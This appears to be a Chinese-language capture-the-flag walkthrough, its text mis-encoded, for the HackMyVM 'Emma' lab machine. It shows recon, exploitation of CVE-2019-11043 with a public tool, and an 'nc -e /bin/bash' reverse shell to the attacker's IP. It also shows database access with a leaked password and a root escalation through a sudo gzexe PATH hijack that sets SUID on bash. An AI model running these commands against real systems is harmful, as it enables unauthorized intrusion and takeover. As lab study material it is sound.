---
{"created":"2024-12-04T11:53:43.994+08:00","tags":["HMV","ç¯å¢ƒå˜é‡åŠ«æŒææƒ","CVE-2019-11043"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸â­ï¸","ä½œè€…":"Emma","aliases":null,"permalink":"/24-æ¸—é€/HMV/37.emma/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/37.emma#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/37.emma#2. ï¸ä¿¡æ¯æ”¶é›†\|2. ï¸ä¿¡æ¯æ”¶é›†]]
- [[24-æ¸—é€/HMV/37.emma#3. phpinfoæ¼æ´åˆ©ç”¨\|3. phpinfoæ¼æ´åˆ©ç”¨]]
- [[24-æ¸—é€/HMV/37.emma#4. www-dataææƒemma\|4. www-dataææƒemma]]
- [[24-æ¸—é€/HMV/37.emma#5. emmaææƒroot\|5. emmaææƒroot]]
	- [[24-æ¸—é€/HMV/37.emma#5.1. gzexeåˆ©ç”¨ åŠ«æŒzip\|5.1. gzexeåˆ©ç”¨ åŠ«æŒzip]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Emma
**ä½œè€…**  Emma
**éš¾åº¦** â­ï¸â­ï¸â­ï¸â­ï¸
## 2. ï¸ä¿¡æ¯æ”¶é›†
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# nmap -sCV 192.168.200.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:4c:af:92:cc:bb:99:59:d7:2f:1b:99:fb:f1:7c:f0 (RSA)
|   256 ba:0d:85:69:43:86:c1:91:7c:db:2a:1e:34:ab:68:1e (ECDSA)
|_  256 a1:ac:2c:ce:f4:07:da:96:12:74:d1:54:9e:f7:09:04 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# nmap 192.168.200.4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds

```

é¦–é¡µ 
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.200.4

ç©ºçš„
```
ç›®å½•æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# dirsearch -u http://192.168.200.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/emma/reports/http_192.168.200.4/_24-12-04_12-05-14.txt

Target: http://192.168.200.4/

[12:05:14] Starting:
[12:05:29] 200 -   58KB - /phpinfo.php
[12:05:31] 200 -   15B  - /robots.txt


â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.200.4/robots.txt
itwasonlyakiss

```

è·å–åˆ°ä¸€ä¸ªå…³é”®å­—ç¬¦ä¸² `itwasonlyakiss`  å¯èƒ½æ˜¯å¯†ç æˆ–è€…ç”¨æˆ·

## 3. phpinfoæ¼æ´åˆ©ç”¨
ç»™äº†æˆ‘ä»¬`Phpinfo.index`
çŒœæµ‹æ˜¯è¦æ‰“ä¸€æ³¢cve
çœ‹ä¸€ä¸‹phpçš„ç‰ˆæœ¬
![assets/Pasted image 20241204123101.png](/img/user/24-%E6%B8%97%E9%80%8F/HMV/assets/Pasted%20image%2020241204123101.png)
ç‰ˆæœ¬ä¸º `7.1.33dev`

æ‰¾åˆ°ä¸€ä¸ªrceçš„æ¼æ´ [[20-ç½‘å®‰/28-CVEå¤ç°/CVE-2019-11043\|CVE-2019-11043]]
https://blog.csdn.net/qq_42133828/article/details/102868522

æ¼æ´åˆ©ç”¨é¡¹ç›®åœ°å€ github.com/neex/phuip-fpizdam

å®‰è£…ç¯å¢ƒ
```bash
apt-get install golang
go get github.com/neex/phuip-fpizdam
export PATH=$PATH:$(go env GOPATH)/bin
```

æ¼æ´æ¢­å“ˆ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# phuip-fpizdam http://192.168.42.43/index.php
2024/12/04 12:39:32 Base status code is 200
2024/12/04 12:39:32 Status code 502 for qsl=1765, adding as a candidate
2024/12/04 12:39:32 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2024/12/04 12:39:32 Attack params found: --qsl 1755 --pisos 23 --skip-detect
2024/12/04 12:39:32 Trying to set "session.auto_start=0"...
2024/12/04 12:39:32 Detect() returned attack params: --qsl 1755 --pisos 23 --skip-detect <-- REMEMBER THIS
2024/12/04 12:39:32 Performing attack using php.ini settings...
2024/12/04 12:39:33 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2024/12/04 12:39:33 Trying to cleanup /tmp/a...
2024/12/04 12:39:33 Done!

```
åå¼¹shell
```bash
urlencode('id;nc -e /bin/bash 192.168.42.39 1234 ')
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.42.115/index.php/?a=/bin/sh+-c+%27id%3Bnc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201234%20%27

â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[~]
â””â”€# pwncat-cs -lp 1234
[12:41:29] Welcome to pwncat ğŸˆ!                                                                       __main__.py:164
[12:50:54] received connection from 192.168.42.115:55396                                                    bind.py:84
[12:50:55] 192.168.42.115:55396: registered new host w/ db                                              manager.py:957
(local) pwncat$
(remote) www-data@emma:/var/www/html$ whoami
www-data
(remote) www-data@emma:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@emma:/var/www/html$

```

## 4. www-dataææƒemma
```bash
(remote) www-data@emma:/var/www/html$ find / -perm /4000 2>/dev/null
/home/emma/who
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
```
é¶æœºå†…éƒ¨å¼€æ”¾äº† `3306` ç«¯å£ 
å¯ä»¥çœ‹ä¸€ä¸‹æ•°æ®åº“
æ•°æ®åº“å¯†ç å°±æ˜¯robots.txt é‡Œé¢çš„é‚£ä¸ª `itwasonlyakiss`
```bash
remote) www-data@emma:/etc$ mysql -uroot -pitwasonlyakiss
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 13
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
4 rows in set (0.012 sec)

MariaDB [(none)]> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.000 sec)

MariaDB [users]> select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f4dcc3b5aa765d61d8327deb882cf80 |
+----+------+----------------------------------+
1 row in set (0.000 sec)

```
![assets/Pasted image 20241204131238.png](/img/user/24-%E6%B8%97%E9%80%8F/HMV/assets/Pasted%20image%2020241204131238.png)
## 5. emmaææƒroot
è¿™é‡Œæœ‰ä¸€ä¸ªå‘ã€‚ è¿™ä¸ªemmaçš„å¯†ç ä¸æ˜¯è§£å¯†åçš„æ˜æ–‡ å°±æ˜¯è¿™ä¸ªMd5å€¼
```bash
(remote) www-data@emma:/etc$ su emma
Password:  5f4dcc3b5aa765d61d8327deb882cf80
emma@emma:/etc$

emma@emma:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: emma

PWNED DATE: Wed 04 Dec 2024 12:16:48 AM EST

WHOAMI: uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: youdontknowme

------------------------

```

```bash
emma@emma:~$ cat who.c
#include <stdio.h>
#include <stdlib.h>
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

emma@emma:~$ sudo -l
Matching Defaults entries for emma on emma:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emma may run the following commands on emma:
    (ALL : ALL) NOPASSWD: /usr/bin/gzexe

```

æˆ‘ä»¬å¯ä»¥ç”¨Rootæƒé™è°ƒç”¨ `gzexe` å‘½ä»¤ 
### 5.1. gzexeåˆ©ç”¨ åŠ«æŒzip
`gzexe` å®é™…ä¸Šæ˜¯ä¸€ä¸ªè„šæœ¬å¯ä»¥å‹ç¼©ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œä¸”è¿™ä¸ªè¢«å‹ç¼©åçš„æ–‡ä»¶åå­—ä¸ä¼šè¢«æ”¹å˜è€Œä¸”ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œ**æ‰§è¡Œè¢«å‹ç¼©åçš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ ä¼šè°ƒç”¨gzipå‘½ä»¤è§£å‹ç¼©**
æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡åŠ«æŒ `gzip` æ¥ææƒ
ä½†æ˜¯è¦ææƒè‚¯å®šæ˜¯éœ€è¦ä¸€ä¸ª**root**çš„æƒé™å»æ‰§è¡Œ `gzip`ï¼Œ

åªè¦**A**è¢« `gzexe` å‹ç¼©ï¼Œé‚£ä¹ˆæ‰§è¡Œ `A` å°±ä¼šè§¦å‘ ``gzip``
å…³é”®ç‚¹åœ¨äºæˆ‘ä»¬æ‰¾å“ªä¸ª**A**è¢« `gzexe` å‹ç¼©

è¦æ±‚Aå¿…é¡»èƒ½è¢«rootæƒé™æ‰§è¡Œ

```bash
emma@emma:~$ cat who.c
#include <stdio.h>
#include <stdlib.h>
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

```

å¯ä»¥å‘ç°æˆ‘ä»¬æ˜¯å¯ä»¥æ‰§è¡Œ `who` çš„ï¼Œè€Œä¸” ä» `who.c` é‡Œé¢çœ‹å‡ºé‡Œé¢ä¸¤æ¬¡æ‰§è¡Œäº† `/bin/id` ï¼Œ
ä¸€æ¬¡æ˜¯rootæ‰§è¡Œï¼Œä¸€æ¬¡æ˜¯æ™®é€šç”¨æˆ·æ‰§è¡Œ

é‚£æˆ‘ä»¬åªè¦åˆ©ç”¨ `gzexe` å‹ç¼© `/bin/id`ï¼Œç„¶åæ‰§è¡Œ `who` è§¦å‘ `gzip` å®Œæˆææƒ

```bash
ç¯å¢ƒå˜é‡åŠ«æŒgzipï¼š
echo 'chmod +s /bin/bash' > /tmp/gzip
chmod +x /tmp/gzip
export PATH=/tmp:$PATH

gzexeå‹ç¼©id:
gzexe /bin/id

æ‰§è¡Œwhoè§¦å‘gzipå®Œæˆææƒ
./who
bash -p
```

```bash
bash-5.0# cat /root/root.txt
itsmeimshe
bash-5.0# cat /home/emma/user.txt
youdontknowme
```
